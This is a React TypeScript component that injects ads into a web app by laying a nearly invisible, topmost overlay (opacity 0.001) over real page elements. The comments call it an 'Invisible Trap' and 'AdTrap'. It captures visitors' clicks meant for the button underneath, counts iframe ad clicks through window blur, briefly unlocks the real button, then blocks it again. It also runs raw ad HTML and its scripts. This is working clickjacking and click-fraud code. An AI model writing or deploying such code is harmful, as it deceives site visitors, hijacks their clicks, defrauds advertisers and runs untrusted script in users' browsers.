import { useEffect } from 'react';
import { useLocation } from 'react-router-dom';
import api from '../api/client';

export default function CustomAdInjector() {
    const location = useLocation();

    useEffect(() => {
        const injectCustomAds = async () => {
            try {
                const { data: ads } = await api.get('/ads');

                // Filter for custom positioned ads
                const customAds = ads.filter((ad: any) =>
                    ad.status === 'active' &&
                    ad.position &&
                    ad.position.startsWith('custom:')
                );

                customAds.forEach((ad: any) => {
                    const selector = ad.position.replace('custom:', '');
                    const adId = `custom-ad-${ad.id}`;

                    // Check if already injected
                    if (document.getElementById(adId)) return;

                    // Attempts to find element (retry logic for dynamic content)
                    let attempts = 0;
                    const maxAttempts = 10;

                    const tryInject = () => {
                        const targetEl = document.querySelector(selector) as HTMLElement;

                        if (targetEl) {
                            console.log(`[CustomAdInjector] 🎯 Found target for "${ad.title}":`, selector);

                            // Create Overlay Container
                            const overlay = document.createElement('div');
                            overlay.id = adId;
                            overlay.className = 'custom-ad-overlay';
                            overlay.dataset.hover = 'false'; // Track hover state

                            // Styles for "Invisible Trap"
                            overlay.style.position = 'absolute';
                            overlay.style.zIndex = '2147483647'; // Max visibility
                            overlay.style.overflow = 'hidden';
                            overlay.style.cursor = 'pointer'; // Show pointer so user thinks it's clickable
                            overlay.style.opacity = '0.001'; // Invisible but interactable
                            overlay.style.pointerEvents = 'auto';
                            overlay.style.background = 'rgba(0,0,0,0.001)'; // Slight background for click capture

                            // Initial Position Sync
                            const updatePosition = () => {
                                if (!targetEl.isConnected) {
                                    overlay.remove();
                                    return;
                                }
                                const rect = targetEl.getBoundingClientRect();
                                overlay.style.top = `${rect.top + window.scrollY}px`;
                                overlay.style.left = `${rect.left + window.scrollX}px`;
                                overlay.style.width = `${rect.width}px`;
                                overlay.style.height = `${rect.height}px`;
                            };

                            updatePosition();

                            // Inject Raw Code
                            const contentWrapper = document.createElement('div');
                            contentWrapper.innerHTML = ad.rawCode;
                            contentWrapper.style.width = '100%';
                            contentWrapper.style.height = '100%';
                            overlay.appendChild(contentWrapper);

                            // Execute Scripts
                            document.body.appendChild(overlay);

                            const scripts = contentWrapper.querySelectorAll('script');
                            scripts.forEach(oldScript => {
                                const newScript = document.createElement('script');
                                Array.from(oldScript.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value));
                                newScript.innerHTML = oldScript.innerHTML;
                                oldScript.parentNode?.replaceChild(newScript, oldScript);
                            });

                            // Hover Tracking for Iframe Click Detection
                            overlay.addEventListener('mouseenter', () => { overlay.dataset.hover = 'true'; });
                            overlay.addEventListener('mouseleave', () => { overlay.dataset.hover = 'false'; });

                            // Direct Click Handling (for non-iframe ads like div/a)
                            overlay.addEventListener('click', () => {
                                console.log('[AdTrap] Click detected on content');
                                triggerCooldown(overlay);
                            });

                            // Keep synced
                            window.addEventListener('resize', updatePosition);
                            window.addEventListener('scroll', updatePosition);
                            const resizeObserver = new ResizeObserver(updatePosition);
                            resizeObserver.observe(targetEl);

                        } else {
                            attempts++;
                            if (attempts < maxAttempts) {
                                setTimeout(tryInject, 500);
                            }
                        }
                    };

                    tryInject();
                });

            } catch (error) {
                console.error('[CustomAdInjector] Failed to fetch ads:', error);
            }
        };

        // Cooldown Logic: Disable overlay for 10s
        const triggerCooldown = (overlay: HTMLElement) => {
            console.log('[AdTrap] Triggering 10s cooldown for:', overlay.id);
            overlay.style.pointerEvents = 'none'; // Unlock button underneath

            setTimeout(() => {
                console.log('[AdTrap] Cooldown over, reactivating:', overlay.id);
                overlay.style.pointerEvents = 'auto'; // Block again
            }, 10000);
        };

        // Global Blur Listener for Iframes
        const handleWindowBlur = () => {
            // Check if any active overlay is currently hovered
            const hoveredOverlay = document.querySelector('.custom-ad-overlay[data-hover="true"]');
            if (hoveredOverlay) {
                console.log('[AdTrap] Window blur detected over ad => Iframe Clicked');
                // Trigger cooldown on the specific overlay
                // Note: triggerCooldown is defined in closure, we can't access it here easily unless we attach it to DOM or move definition out.
                // Re-implementing simplified logic here for robustness:
                (hoveredOverlay as HTMLElement).style.pointerEvents = 'none';
                setTimeout(() => {
                    (hoveredOverlay as HTMLElement).style.pointerEvents = 'auto';
                }, 10000);
            }
        };

        window.addEventListener('blur', handleWindowBlur);

        injectCustomAds();

        // Cleanup
        return () => {
            window.removeEventListener('blur', handleWindowBlur);
            const overlays = document.querySelectorAll('.custom-ad-overlay');
            overlays.forEach(el => el.remove());
        };
    }, [location.pathname]);

    return null;
}
